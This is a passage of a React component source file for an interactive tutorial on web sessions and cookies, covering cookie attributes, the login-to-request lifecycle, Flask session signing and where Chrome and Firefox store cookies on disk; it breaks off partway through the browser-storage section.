import { useState } from "react";

/* ── SVG Sequence Diagram: Cookie Lifecycle ── */
const CookieLifecycleDiagram = () => {
  const W = 780, H = 520;
  const actors = [
    { label: "Browser", sub: "(Client)", x: 100, c: "#2563EB", bg: "#EFF6FF" },
    { label: "Flask / FastAPI", sub: "(Backend)", x: 380, c: "#059669", bg: "#ECFDF5" },
    { label: "Session Store", sub: "(Server-side)", x: 640, c: "#9333EA", bg: "#FAF5FF" },
  ];
  const msgs = [
    { f: 0, t: 1, y: 95,  lbl: "1. POST /login", sub: "username + password (over HTTPS)", c: "#2563EB" },
    { f: 1, t: 2, y: 150, lbl: "2. Create session", sub: "Store {user_id, role, exp} → get session_id", c: "#059669" },
    { f: 2, t: 1, y: 200, lbl: "3. Return session_id", sub: "e.g. 'a3f8c9...signed'", c: "#9333EA" },
    { f: 1, t: 0, y: 260, lbl: "4. Set-Cookie", sub: "session=a3f8c9...; HttpOnly; Secure; SameSite=Lax", c: "#059669" },
    { f: 0, t: 1, y: 330, lbl: "5. GET /dashboard", sub: "Cookie: session=a3f8c9... (auto-attached by browser)", c: "#2563EB" },
    { f: 1, t: 2, y: 385, lbl: "6. Lookup session", sub: "Validate signature → deserialize → check expiry", c: "#059669" },
    { f: 2, t: 1, y: 435, lbl: "7. Session data", sub: "{user_id: 42, role: 'admin', ...}", c: "#9333EA" },
    { f: 1, t: 0, y: 490, lbl: "8. 200 OK + HTML", sub: "Personalized response for user_id=42", c: "#059669" },
  ];
  const mkrIds = { "#2563EB": "sc-blue", "#059669": "sc-green", "#9333EA": "sc-purple" };
  return (
    <div className="overflow-x-auto my-5">
      <svg viewBox={`0 0 ${W} ${H}`} className="w-full min-w-[700px]" style={{ maxHeight: 540 }}>
        <defs>
          {Object.entries(mkrIds).map(([color, id]) => (
            <marker key={id} id={id} markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
              <polygon points="0 0, 8 3, 0 6" fill={color} />
            </marker>
          ))}
          <filter id="scs" x="-4%" y="-4%" width="108%" height="108%"><feDropShadow dx="1" dy="1" stdDeviation="2" floodOpacity="0.1"/></filter>
        </defs>
        {actors.map((a, i) => (
          <g key={i}>
            <rect x={a.x - 60} y={10} width={120} height={48} rx={8} fill={a.bg} stroke={a.c} strokeWidth={2} filter="url(#scs)" />
            <text x={a.x} y={30} textAnchor="middle" fontSize={12} fontWeight="bold" fill={a.c}>{a.label}</text>
            <text x={a.x} y={44} textAnchor="middle" fontSize={9} fill={a.c} opacity={0.7}>{a.sub}</text>
            <line x1={a.x} y1={58} x2={a.x} y2={H - 5} stroke={a.c} strokeWidth={1.5} strokeDasharray="6,4" opacity={0.3} />
          </g>
        ))}
        {/* Phase backgrounds */}
        <rect x={5} y={78} width={W - 10} height={195} rx={6} fill="#ECFDF5" opacity={0.3} />
        <text x={15} y={91} fontSize={9} fontWeight="bold" fill="#065F46" opacity={0.7}>LOGIN — Session Creation</text>
        <rect x={5} y={310} width={W - 10} height={200} rx={6} fill="#EFF6FF" opacity={0.3} />
        <text x={15} y={323} fontSize={9} fontWeight="bold" fill="#1E40AF" opacity={0.7}>SUBSEQUENT REQUEST — Cookie Sent Automatically</text>
        {msgs.map((m, i) => {
          const x1 = actors[m.f].x, x2 = actors[m.t].x;
          const dir = x2 > x1 ? 1 : -1;
          const lx1 = x1 + dir * 8, lx2 = x2 - dir * 8;
          const mid = (lx1 + lx2) / 2;
          const mkr = `url(#${mkrIds[m.c] || "sc-blue"})`;
          return (
            <g key={i}>
              <line x1={lx1} y1={m.y} x2={lx2} y2={m.y} stroke={m.c} strokeWidth={2} markerEnd={mkr} />
              <rect x={mid - 65} y={m.y - 22} width={130} height={16} rx={4} fill={m.c} opacity={0.85} />
              <text x={mid} y={m.y - 11} textAnchor="middle" fontSize={9.5} fontWeight="bold" fill="white">{m.lbl}</text>
              <text x={mid} y={m.y + 14} textAnchor="middle" fontSize={8} fill="#4B5563">{m.sub}</text>
            </g>
          );
        })}
      </svg>
    </div>
  );
};

/* ── SVG: Cookie Persistence Diagram ── */
const CookiePersistenceDiagram = () => {
  const W = 780, H = 340;
  return (
    <div className="overflow-x-auto my-5">
      <svg viewBox={`0 0 ${W} ${H}`} className="w-full min-w-[700px]" style={{ maxHeight: 360 }}>
        <defs>
          <filter id="pds" x="-4%" y="-4%" width="108%" height="108%"><feDropShadow dx="1" dy="1" stdDeviation="2" floodOpacity="0.1"/></filter>
        </defs>
        {/* Browser box */}
        <rect x={10} y={10} width={760} height={320} rx={12} fill="#F8FAFC" stroke="#E2E8F0" strokeWidth={2} />
        <text x={30} y={38} fontSize={14} fontWeight="bold" fill="#1E293B">Browser Cookie Storage</text>

        {/* Session Cookie */}
        <rect x={30} y={60} width={340} height={250} rx={10} fill="#FEF2F2" stroke="#FCA5A5" strokeWidth={2} filter="url(#pds)" />
        <text x={50} y={88} fontSize={13} fontWeight="bold" fill="#DC2626">Session Cookie (no Expires)</text>
        <text x={50} y={110} fontSize={10} fill="#7F1D1D">Stored in: RAM (process memory)</text>
        <line x1={50} y1={120} x2={350} y2={120} stroke="#FCA5A5" strokeWidth={1} />
        <text x={50} y={142} fontSize={10} fill="#374151">Set-Cookie: session=abc123;</text>
        <text x={50} y={158} fontSize={10} fill="#374151">  HttpOnly; Secure; SameSite=Lax</text>
        <text x={50} y={182} fontSize={10} fill="#6B7280" fontStyle="italic">No Expires or Max-Age header</text>
        <text x={50} y={210} fontSize={10} fill="#374151" fontWeight="bold">Lifecycle:</text>
        <text x={50} y={228} fontSize={10} fill="#6B7280">• Created when server sends Set-Cookie</text>
        <text x={50} y={246} fontSize={10} fill="#6B7280">• Lives in browser memory only</text>
        <text x={50} y={264} fontSize={10} fill="#DC2626" fontWeight="bold">• DELETED when browser closes</text>
        <text x={50} y={282} fontSize={10} fill="#6B7280">• Not written to disk</text>
        <text x={50} y={300} fontSize={10} fill="#6B7280">• Not shared across browser profiles</text>

        {/* Persistent Cookie */}
        <rect x={400} y={60} width={350} height={250} rx={10} fill="#ECFDF5" stroke="#6EE7B7" strokeWidth={2} filter="url(#pds)" />
        <text x={420} y={88} fontSize={13} fontWeight="bold" fill="#059669">Persistent Cookie (has Expires)</text>
        <text x={420} y={110} fontSize={10} fill="#064E3B">Stored in: Disk (SQLite / file)</text>
        <line x1={420} y1={120} x2={730} y2={120} stroke="#6EE7B7" strokeWidth={1} />
        <text x={420} y={142} fontSize={10} fill="#374151">Set-Cookie: remember=xyz789;</text>
        <text x={420} y={158} fontSize={10} fill="#374151">  Max-Age=604800; HttpOnly; Secure</text>
        <text x={420} y={182} fontSize={10} fill="#6B7280" fontStyle="italic">Expires in 7 days (604800 seconds)</text>
        <text x={420} y={210} fontSize={10} fill="#374151" fontWeight="bold">Lifecycle:</text>
        <text x={420} y={228} fontSize={10} fill="#6B7280">• Created when server sends Set-Cookie</text>
        <text x={420} y={246} fontSize={10} fill="#6B7280">• Written to disk (survives restart)</text>
        <text x={420} y={264} fontSize={10} fill="#059669" fontWeight="bold">• SURVIVES browser close</text>
        <text x={420} y={282} fontSize={10} fill="#6B7280">• Deleted when Max-Age / Expires reached</text>
        <text x={420} y={300} fontSize={10} fill="#6B7280">• Chrome: ~/Library/.../Cookies (SQLite)</text>
      </svg>
    </div>
  );
};

/* ── SVG: Flask/FastAPI Signing Diagram ── */
const SigningDiagram = () => {
  const W = 780, H = 380;
  return (
    <div className="overflow-x-auto my-5">
      <svg viewBox={`0 0 ${W} ${H}`} className="w-full min-w-[700px]" style={{ maxHeight: 400 }}>
        <defs>
          <filter id="sds" x="-4%" y="-4%" width="108%" height="108%"><feDropShadow dx="1" dy="1" stdDeviation="2" floodOpacity="0.1"/></filter>
          <marker id="sg-arr" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0 0, 8 3, 0 6" fill="#374151" /></marker>
        </defs>

        {/* Session data box */}
        <rect x={20} y={20} width={200} height={80} rx={10} fill="#EFF6FF" stroke="#3B82F6" strokeWidth={2} filter="url(#sds)" />
        <text x={120} y={48} textAnchor="middle" fontSize={12} fontWeight="bold" fill="#1E40AF">Session Data</text>
        <text x={120} y={68} textAnchor="middle" fontSize={10} fill="#3B82F6">{"{ user_id: 42, role: 'admin' }"}</text>
        <text x={120} y={85} textAnchor="middle" fontSize={9} fill="#6B7280">(Python dict / JSON)</text>

        {/* Arrow to serializer */}
        <line x1={225} y1={60} x2={275} y2={60} stroke="#374151" strokeWidth={2} markerEnd="url(#sg-arr)" />
        <text x={250} y={50} textAnchor="middle" fontSize={8} fill="#6B7280">serialize</text>

        {/* Serializer box */}
        <rect x={280} y={20} width={200} height={80} rx={10} fill="#FAF5FF" stroke="#8B5CF6" strokeWidth={2} filter="url(#sds)" />
        <text x={380} y={42} textAnchor="middle" fontSize={11} fontWeight="bold" fill="#6D28D9">itsdangerous</text>
        <text x={380} y={60} textAnchor="middle" fontSize={9} fill="#8B5CF6">URLSafeTimedSerializer</text>
        <text x={380} y={78} textAnchor="middle" fontSize={9} fill="#6B7280">HMAC-SHA512 signing</text>
        <text x={380} y={92} textAnchor="middle" fontSize={8} fill="#6B7280">(zlib compress → base64 → sign)</text>

        {/* Arrow to cookie */}
        <line x1={485} y1={60} x2={535} y2={60} stroke="#374151" strokeWidth={2} markerEnd="url(#sg-arr)" />
        <text x={510} y={50} textAnchor="middle" fontSize={8} fill="#6B7280">sign</text>

        {/* Cookie value */}
        <rect x={540} y={20} width={220} height={80} rx={10} fill="#ECFDF5" stroke="#059669" strokeWidth={2} filter="url(#sds)" />
        <text x={650} y={42} textAnchor="middle" fontSize={11} fontWeight="bold" fill="#065F46">Cookie Value</text>
        <text x={650} y={62} textAnchor="middle" fontSize={8} fill="#059669" fontFamily="monospace">eyJ1c2VyX2lkIjo0Mn0.</text>
        <text x={650} y={76} textAnchor="middle" fontSize={8} fill="#059669" fontFamily="monospace">ZHN0YW1w.HMAC_SIGNATURE</text>
        <text x={650} y={92} textAnchor="middle" fontSize={8} fill="#6B7280">(base64 payload . timestamp . sig)</text>

        {/* SECRET_KEY */}
        <rect x={280} y={130} width={200} height={50} rx={8} fill="#FEF2F2" stroke="#EF4444" strokeWidth={2} filter="url(#sds)" />
        <text x={380} y={152} textAnchor="middle" fontSize={11} fontWeight="bold" fill="#DC2626">SECRET_KEY</text>
        <text x={380} y={170} textAnchor="middle" fontSize={9} fill="#EF4444">"super-secret-random-bytes"</text>
        <line x1={380} y1={105} x2={380} y2={125} stroke="#EF4444" strokeWidth={2} strokeDasharray="4,3" />
        <text x={395} y={118} fontSize={8} fill="#DC2626">used for HMAC</text>

        {/* Verification flow (bottom) */}
        <rect x={20} y={220} width={740} height={140} rx={12} fill="#F8FAFC" stroke="#E2E8F0" strokeWidth={2} />
        <text x={40} y={248} fontSize={12} fontWeight="bold" fill="#1E293B">Verification (on each request):</text>

        <rect x={40} y={260} width={150} height={45} rx={8} fill="#EFF6FF" stroke="#3B82F6" strokeWidth={1.5} />
        <text x={115} y={280} textAnchor="middle" fontSize={10} fontWeight="bold" fill="#1E40AF">Incoming Cookie</text>
        <text x={115} y={296} textAnchor="middle" fontSize={8} fill="#3B82F6">payload.timestamp.sig</text>

        <line x1={195} y1={282} x2={230} y2={282} stroke="#374151" strokeWidth={2} markerEnd="url(#sg-arr)" />

        <rect x={235} y={260} width={160} height={45} rx={8} fill="#FAF5FF" stroke="#8B5CF6" strokeWidth={1.5} />
        <text x={315} y={280} textAnchor="middle" fontSize={10} fontWeight="bold" fill="#6D28D9">Re-compute HMAC</text>
        <text x={315} y={296} textAnchor="middle" fontSize={8} fill="#8B5CF6">HMAC(payload+ts, SECRET_KEY)</text>

        <line x1={400} y1={282} x2={435} y2={282} stroke="#374151" strokeWidth={2} markerEnd="url(#sg-arr)" />

        <rect x={440} y={260} width={130} height={45} rx={8} fill="#FEF9C3" stroke="#EAB308" strokeWidth={1.5} />
        <text x={505} y={280} textAnchor="middle" fontSize={10} fontWeight="bold" fill="#854D0E">Compare Sigs</text>
        <text x={505} y={296} textAnchor="middle" fontSize={8} fill="#A16207">computed == received?</text>

        <line x1={575} y1={272} x2={620} y2={262} stroke="#059669" strokeWidth={2} markerEnd="url(#sg-arr)" />
        <line x1={575} y1={292} x2={620} y2={302} stroke="#DC2626" strokeWidth={2} markerEnd="url(#sg-arr)" />

        <rect x={625} y={248} width={115} height={28} rx={6} fill="#ECFDF5" stroke="#059669" strokeWidth={1.5} />
        <text x={682} y={267} textAnchor="middle" fontSize={10} fontWeight="bold" fill="#059669">Valid Session</text>

        <rect x={625} y={290} width={115} height={28} rx={6} fill="#FEF2F2" stroke="#EF4444" strokeWidth={1.5} />
        <text x={682} y={309} textAnchor="middle" fontSize={10} fontWeight="bold" fill="#DC2626">Reject (403)</text>

        <text x={40} y={348} fontSize={9} fill="#6B7280" fontStyle="italic">Note: The cookie is SIGNED, not ENCRYPTED. Users can decode the payload (base64) but cannot tamper without SECRET_KEY.</text>
      </svg>
    </div>
  );
};

export default function SessionCookiesGuide() {
  const [active, setActive] = useState("overview");
  const [expanded, setExpanded] = useState(null);
  const [quizAns, setQuizAns] = useState({});
  const [showRes, setShowRes] = useState(false);

  /* ── helper components ─────────────────────────────── */

  const Analogy = ({ children }) => (
    <div className="bg-amber-50 border-2 border-amber-300 rounded-xl p-4 my-4">
      <div className="flex items-center gap-2 mb-2">
        <span className="text-xl">🎭</span>
        <span className="font-bold text-amber-800 text-sm">Real-World Analogy</span>
      </div>
      <p className="text-sm text-amber-900 leading-relaxed">{children}</p>
    </div>
  );

  const Warning = ({ title, children }) => (
    <div className="bg-red-50 border-2 border-red-300 rounded-xl p-4 my-4">
      <div className="flex items-center gap-2 mb-2">
        <span className="text-xl">⚠️</span>
        <span className="font-bold text-red-800 text-sm">{title || "Security Warning"}</span>
      </div>
      <div className="text-sm text-red-900 leading-relaxed">{children}</div>
    </div>
  );

  const InfoBox = ({ title, children }) => (
    <div className="bg-blue-50 border-2 border-blue-300 rounded-xl p-4 my-4">
      <div className="flex items-center gap-2 mb-2">
        <span className="text-xl">💡</span>
        <span className="font-bold text-blue-800 text-sm">{title || "Key Insight"}</span>
      </div>
      <div className="text-sm text-blue-900 leading-relaxed">{children}</div>
    </div>
  );

  const DiagramBox = ({ title, children }) => (
    <div className="my-4 rounded-xl overflow-hidden border-2 border-slate-200">
      {title && (
        <div className="bg-slate-800 text-slate-200 px-4 py-2 text-xs font-bold tracking-wide uppercase">{title}</div>
      )}
      <pre className="bg-slate-900 text-green-400 p-4 text-xs leading-relaxed overflow-x-auto m-0 font-mono">
        {children}
      </pre>
    </div>
  );

  const CodeBlock = ({ title, children }) => (
    <div className="my-3 rounded-xl overflow-hidden border border-slate-200">
      {title && (
        <div className="bg-slate-700 text-slate-200 px-4 py-1.5 text-xs font-bold">{title}</div>
      )}
      <pre className="bg-slate-900 text-emerald-400 p-4 text-xs leading-relaxed overflow-x-auto m-0 font-mono">
        {children}
      </pre>
    </div>
  );

  const ExpandCard = ({ id, icon, title, subtitle, color, children }) => {
    const isOpen = expanded === id;
    return (
      <div
        onClick={() => setExpanded(isOpen ? null : id)}
        className={`mb-3 border-2 rounded-xl overflow-hidden cursor-pointer transition-all ${isOpen ? "shadow-md" : "hover:shadow-sm"}`}
        style={{ borderColor: isOpen ? color : "#e2e8f0", background: isOpen ? color + "08" : "#fff" }}
      >
        <div className="p-4 flex items-center gap-3">
          <span className="text-2xl flex-shrink-0">{icon}</span>
          <div className="flex-1 min-w-0">
            <div className="font-bold text-sm" style={{ color: isOpen ? color : "#1e293b" }}>{title}</div>
            {subtitle && <div className="text-xs text-slate-500 mt-0.5">{subtitle}</div>}
          </div>
          <span className="text-slate-400 text-xs flex-shrink-0">{isOpen ? "▲" : "▼"}</span>
        </div>
        {isOpen && (
          <div className="px-4 pb-4 ml-10" onClick={(e) => e.stopPropagation()}>
            <div className="border-t pt-3 text-sm text-slate-700 leading-relaxed" style={{ borderColor: color + "30" }}>
              {children}
            </div>
          </div>
        )}
      </div>
    );
  };

  const SectionTitle = ({ icon, children }) => (
    <h3 className="flex items-center gap-2 text-lg font-bold text-slate-800 mb-4 mt-6">
      <span className="text-xl">{icon}</span> {children}
    </h3>
  );

  /* ── section navigation ────────────────────────────── */

  const sections = [
    { id: "overview", title: "Overview", icon: "🍪", color: "#f59e0b" },
    { id: "lifecycle", title: "Request Lifecycle", icon: "🔄", color: "#3b82f6" },
    { id: "persistence", title: "Browser Storage", icon: "💾", color: "#8b5cf6" },
    { id: "flask", title: "Flask Sessions", icon: "🧪", color: "#10b981" },
    { id: "fastapi", title: "FastAPI Sessions", icon: "⚡", color: "#ec4899" },
    { id: "security", title: "Security", icon: "🛡️", color: "#ef4444" },
    { id: "quiz", title: "Quiz", icon: "🧠", color: "#6366f1" },
  ];

  /* ══════════════════════════════════════════════════════
     SECTION 1 — OVERVIEW
     ══════════════════════════════════════════════════════ */

  const renderOverview = () => (
    <div>
      <SectionTitle icon="🍪">What Are Sessions & Cookies?</SectionTitle>
      <p className="text-sm text-slate-600 leading-relaxed mb-4">
        HTTP is <strong>stateless</strong> — every request is independent. The server has no memory of previous requests. Sessions and cookies solve this by maintaining state across requests, enabling features like login, shopping carts, and user preferences.
      </p>

      <Analogy>
        Imagine a hotel with amnesia. Every time you walk up to the front desk, they have no idea who you are. So they give you a <strong>wristband with a number</strong> (cookie). When you come back, you show the wristband, and they look up your number in their <strong>guest book</strong> (session store) to find your room, preferences, and room service orders.
      </Analogy>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
        <div className="bg-amber-50 border-2 border-amber-200 rounded-xl p-5">
          <div className="text-3xl mb-2">🍪</div>
          <h4 className="font-bold text-amber-800 text-sm mb-2">Cookie</h4>
          <p className="text-xs text-amber-700 leading-relaxed mb-2">A <strong>small piece of data</strong> stored in the browser and sent with every HTTP request to the same domain. It's just a key-value pair in an HTTP header.</p>
          <div className="bg-white rounded-lg p-3 text-xs font-mono">
            <p className="text-slate-400"># Server → Browser (response header)</p>
            <p>Set-Cookie: session_id=abc123; HttpOnly; Secure</p>
            <p className="mt-2 text-slate-400"># Browser → Server (every subsequent request)</p>
            <p>Cookie: session_id=abc123</p>
          </div>
        </div>
        <div className="bg-indigo-50 border-2 border-indigo-200 rounded-xl p-5">
          <div className="text-3xl mb-2">📋</div>
          <h4 className="font-bold text-indigo-800 text-sm mb-2">Session</h4>
          <p className="text-xs text-indigo-700 leading-relaxed mb-2">A <strong>server-side data structure</strong> that stores user state (login status, cart items, preferences). The session ID is stored in the cookie — the actual data lives on the server.</p>
          <div className="bg-white rounded-lg p-3 text-xs font-mono">
            <p className="text-slate-400"># Server-side session store</p>
            <p>sessions["abc123"] = {"{"}</p>
            <p>  "user_id": 42,</p>
            <p>  "role": "admin",</p>
            <p>  "cart": [101, 205],</p>
            <p>  "expires": "2026-03-02T08:00:00Z"</p>
            <p>{"}"}</p>
          </div>
        </div>
      </div>

      <SectionTitle icon="🔑">Cookie Attributes Cheat Sheet</SectionTitle>
      <div className="overflow-x-auto mb-4">
        <table className="w-full text-sm border-collapse">
          <thead>
            <tr className="bg-slate-100">
              <th className="border border-slate-200 p-3 text-left font-bold">Attribute</th>
              <th className="border border-slate-200 p-3 text-left font-bold">Purpose</th>
              <th className="border border-slate-200 p-3 text-left font-bold">Example</th>
            </tr>
          </thead>
          <tbody>
            {[
              ["HttpOnly", "Prevents JavaScript from reading the cookie (blocks XSS theft)", "Set-Cookie: s=x; HttpOnly"],
              ["Secure", "Only sent over HTTPS connections", "Set-Cookie: s=x; Secure"],
              ["SameSite=Lax", "Sent on same-site requests + top-level GET navigations (CSRF protection)", "Set-Cookie: s=x; SameSite=Lax"],
              ["SameSite=Strict", "Only sent on same-site requests (strongest CSRF protection)", "Set-Cookie: s=x; SameSite=Strict"],
              ["SameSite=None", "Sent on all cross-site requests (requires Secure)", "Set-Cookie: s=x; SameSite=None; Secure"],
              ["Max-Age=N", "Cookie expires after N seconds", "Set-Cookie: s=x; Max-Age=3600"],
              ["Expires=date", "Cookie expires at specific date/time", "Set-Cookie: s=x; Expires=Sun, 01 Mar 2026 ..."],
              ["Domain=.x.com", "Cookie sent to x.com and all subdomains", "Set-Cookie: s=x; Domain=.example.com"],
              ["Path=/app", "Cookie only sent for requests under /app", "Set-Cookie: s=x; Path=/app"],
            ].map((r, i) => (
              <tr key={i} className={i % 2 === 0 ? "bg-white" : "bg-slate-50"}>
                <td className="border border-slate-200 p-3 font-mono text-xs font-bold">{r[0]}</td>
                <td className="border border-slate-200 p-3 text-xs">{r[1]}</td>
                <td className="border border-slate-200 p-3 font-mono text-xs text-slate-500">{r[2]}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <DiagramBox title="Client-Side vs Server-Side Sessions">
{`  ┌──────────────────────────────────────────────────────────────────┐
  │         TWO APPROACHES TO SESSION MANAGEMENT                    │
  │                                                                  │
  │  ┌─────────────────────────┐   ┌──────────────────────────────┐ │
  │  │ CLIENT-SIDE SESSION     │   │ SERVER-SIDE SESSION           │ │
  │  │ (Flask default)         │   │ (FastAPI + Redis/DB)          │ │
  │  │                         │   │                               │ │
  │  │ Cookie contains the     │   │ Cookie contains only the     │ │
  │  │ ACTUAL session data     │   │ SESSION ID (a random key)    │ │
  │  │ (signed, not encrypted) │   │                               │ │
  │  │                         │   │ Actual data stored on server  │ │
  │  │ ✅ No server storage     │   │ ✅ Data hidden from client    │ │
  │  │ ✅ Horizontally scalable │   │ ✅ Can store large data       │ │
  │  │ ⚠️ Data visible to user  │   │ ✅ Can invalidate server-side│ │
  │  │ ⚠️ 4KB cookie size limit │   │ ⚠️ Needs shared store (Redis)│ │
  │  │ ⚠️ Can't revoke easily   │   │ ⚠️ Adds latency (store hop) │ │
  │  └─────────────────────────┘   └──────────────────────────────┘ │
  └──────────────────────────────────────────────────────────────────┘`}
      </DiagramBox>
    </div>
  );

  /* ══════════════════════════════════════════════════════
     SECTION 2 — REQUEST LIFECYCLE
     ══════════════════════════════════════════════════════ */

  const renderLifecycle = () => (
    <div>
      <SectionTitle icon="🔄">How Cookies Travel Between Requests</SectionTitle>
      <p className="text-sm text-slate-600 leading-relaxed mb-4">
        Cookies are set by the server via the <code className="bg-slate-100 px-1.5 py-0.5 rounded text-xs font-mono">Set-Cookie</code> response header and automatically attached by the browser to every subsequent request to the same domain via the <code className="bg-slate-100 px-1.5 py-0.5 rounded text-xs font-mono">Cookie</code> request header. The browser handles this transparently — no JavaScript required.
      </p>

      <CookieLifecycleDiagram />

      <SectionTitle icon="📨">Step-by-Step: First Login → Subsequent Requests</SectionTitle>

      <ExpandCard id="lc-1" icon="1️⃣" title="User submits login form" subtitle="POST /login with credentials" color="#3b82f6">
        <CodeBlock title="HTTP Request">
{`POST /login HTTP/1.1
Host: app.example.com
Content-Type: application/x-www-form-urlencoded

username=jana&password=s3cur3`}
        </CodeBlock>
        <p className="mt-2">The browser sends credentials over HTTPS. The server validates against the user database (hash comparison).</p>
      </ExpandCard>

      <ExpandCard id="lc-2" icon="2️⃣" title="Server creates session & sends Set-Cookie" subtitle="Response includes the session cookie" color="#10b981">
        <CodeBlock title="HTTP Response">
{`HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: session=eyJ1c2VyX2lkIjo0Mn0.ZGF0ZQ.HMAC_SIG;
            HttpOnly;
            Secure;
            SameSite=Lax;
            Path=/;
            Max-Age=3600`}
        </CodeBlock>
        <p className="mt-2">The <code className="bg-slate-100 px-1 rounded text-xs">Set-Cookie</code> header tells the browser: "Store this value, and send it back with every future request to this domain."</p>
      </ExpandCard>

      <ExpandCard id="lc-3" icon="3️⃣" title="Browser stores the cookie" subtitle="Automatic — no JavaScript needed" color="#8b5cf6">
        <p className="mb-2">The browser parses the <code className="bg-slate-100 px-1 rounded text-xs">Set-Cookie</code> header and stores the cookie with its attributes:</p>
        <div className="bg-slate-50 rounded-lg p-3 font-mono text-xs">
          <p>Name: session</p>
          <p>Value: eyJ1c2VyX2lkIjo0Mn0.ZGF0ZQ.HMAC_SIG</p>
          <p>Domain: app.example.com</p>
          <p>Path: /</p>
          <p>Expires: 2026-03-01T09:00:00Z (1 hour from now)</p>
          <p>HttpOnly: true (JS can't read it)</p>
          <p>Secure: true (HTTPS only)</p>
          <p>SameSite: Lax</p>
        </div>
      </ExpandCard>

      <ExpandCard id="lc-4" icon="4️⃣" title="Subsequent requests include cookie automatically" subtitle="Browser attaches Cookie header to every matching request" color="#f59e0b">
        <CodeBlock title="Every subsequent request to app.example.com">
{`GET /dashboard HTTP/1.1
Host: app.example.com
Cookie: session=eyJ1c2VyX2lkIjo0Mn0.ZGF0ZQ.HMAC_SIG

GET /api/profile HTTP/1.1
Host: app.example.com
Cookie: session=eyJ1c2VyX2lkIjo0Mn0.ZGF0ZQ.HMAC_SIG

POST /api/cart/add HTTP/1.1
Host: app.example.com
Cookie: session=eyJ1c2VyX2lkIjo0Mn0.ZGF0ZQ.HMAC_SIG`}
        </CodeBlock>
        <p className="mt-2">The browser <strong>automatically</strong> adds the <code className="bg-slate-100 px-1 rounded text-xs">Cookie</code> header to every request that matches the cookie's domain, path, and security attributes. No JavaScript. No fetch configuration. It just happens.</p>
      </ExpandCard>

      <ExpandCard id="lc-5" icon="5️⃣" title="Server validates on each request" subtitle="Read cookie → verify signature → load session → authorize" color="#ef4444">
        <DiagramBox title="Server-side validation per request">
{`  Incoming Request
       │
       ▼
  ┌─────────────┐    No cookie?     ┌─────────────┐
  │ Read Cookie  │──────────────────►│ 401 or      │
  │ header       │                   │ redirect to  │
  └──────┬───────┘                   │ /login       │
         │ Has cookie                └─────────────┘
         ▼
  ┌─────────────┐    Sig invalid?    ┌─────────────┐
  │ Verify HMAC  │──────────────────►│ 403 Tampered │
  │ signature    │                   │ session      │
  └──────┬───────┘                   └─────────────┘
         │ Signature valid
         ▼
  ┌─────────────┐    Expired?        ┌─────────────┐
  │ Check expiry │──────────────────►│ 401 Session  │
  │              │                   │ expired      │
  └──────┬───────┘                   └─────────────┘
         │ Still valid
         ▼
  ┌─────────────┐
  │ Load session │
  │ data → serve │
  │ the request  │
  └─────────────┘`}
        </DiagramBox>
      </ExpandCard>

      <ExpandCard id="lc-6" icon="6️⃣" title="Logout: Cookie deleted" subtitle="Server sends Set-Cookie with Max-Age=0" color="#6366f1">
        <CodeBlock title="Logout Response">
{`HTTP/1.1 302 Found
Location: /login
Set-Cookie: session=; Max-Age=0; Path=/; HttpOnly; Secure`}
        </CodeBlock>
        <p className="mt-2">Setting <code className="bg-slate-100 px-1 rounded text-xs">Max-Age=0</code> tells the browser to delete the cookie immediately. Server-side, the session data is also destroyed.</p>
      </ExpandCard>
    </div>
  );

  /* ══════════════════════════════════════════════════════
     SECTION 3 — BROWSER STORAGE
     ══════════════════════════════════════════════════════ */

  const renderPersistence = () => (
    <div>
      <SectionTitle icon="💾">How Cookies Persist in the Browser</SectionTitle>
      <p className="text-sm text-slate-600 leading-relaxed mb-4">
        Cookies can be either <strong>session cookies</strong> (deleted when the browser closes) or <strong>persistent cookies</strong> (stored on disk until they expire). The presence of <code className="bg-slate-100 px-1.5 py-0.5 rounded text-xs font-mono">Max-Age</code> or <code className="bg-slate-100 px-1.5 py-0.5 rounded text-xs font-mono">Expires</code> determines which type.
      </p>

      <CookiePersistenceDiagram />

      <SectionTitle icon="📂">Where Browsers Store Cookies</SectionTitle>

      <ExpandCard id="ps-chrome" icon="🌐" title="Chrome / Edge (Chromium)" subtitle="SQLite database on disk" color="#3b82f6">
        <div className="space-y-2 text-xs">
          <p><strong>Location:</strong></p>
          <div className="bg-slate-50 rounded-lg p-3 font-mono">
            <p>Windows: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies</p>
            <p>macOS:   ~/Library/Application Support/Google/Chrome/Default/Cookies</p>
            <p>Linux:   ~/.config/google-chrome/Default/Cookies</p>
          </div>
          <p className="mt-2"><strong>Format:</strong> SQLite database with a <code className="bg-white px-1 rounded">cookies</code> table containing columns: name, value, host_key, path, expires_utc, is_secure, is_httponly, samesite, encrypted_value.</p>
          <p><strong>Encryption:</strong> Chrome encrypts cookie values using the OS keychain (DPAPI on Windows, Keychain on macOS). The <code className="bg-white px-1 rounded">encrypted_value</code> column is used instead of <code className="bg-white px-1 rounded">value</code>.</p>
        </div>
      </ExpandCard>

      <ExpandCard id="ps-firefox" icon="🦊" title="Firefox" subtitle="SQLite database on disk" color="#f59e0b">
        <div className="space-y-2 text-xs">
          <p><strong>Location:</strong></p>
          <div className="bg-slate-50 rounded-lg p-3 font-mono">
            <p>Windows: %APPDATA%\Mozilla\Firefox\Profiles\*.default\cookies.sqlite</p>
            <p>macOS:   ~/Library/Application Support/Firefox/Profiles/*/cookies.sqlite</p>
            <p>Linux:   ~/.mozilla/firefox/*.default/cookies.sqlite</p>
          </div>
          <p><strong>Format:</strong> SQLite database. Table <code className="bg-white px-1 rounded">moz_cookies</code>.</p>
          <p><strong>Encryption:</strong> Not encrypted on disk by default (relies on OS disk encryption).</p>
        </div>
      </ExpandCard>

      <ExpandCard id="ps-session" icon="🧠" title="Session Cookies (in-memory)" subtitle="Never written to disk — lost when browser closes" color="#8b5cf6">
        <p className="mb-2">Session cookies (no <code className="bg-white px-1 rounded text-xs">Max-Age</code> or <code className="bg-white px-1 rounded text-xs">Expires</code>) are stored only in the browser process's RAM.</p>
        <Warning title="Modern Exception: Session Restore">
          Most modern browsers have "restore previous session" features. Chrome and Firefox may serialize session cookies to disk on shutdown and restore them. This means session cookies may survive browser restarts even though the spec says they shouldn't. For security-critical apps, always set explicit <code className="bg-white px-1 rounded text-xs">Max-Age</code> instead of relying on session cookie behavior.
        </Warning>
      </ExpandCard>

      <DiagramBox title="Cookie Scope — When Are They Sent?">
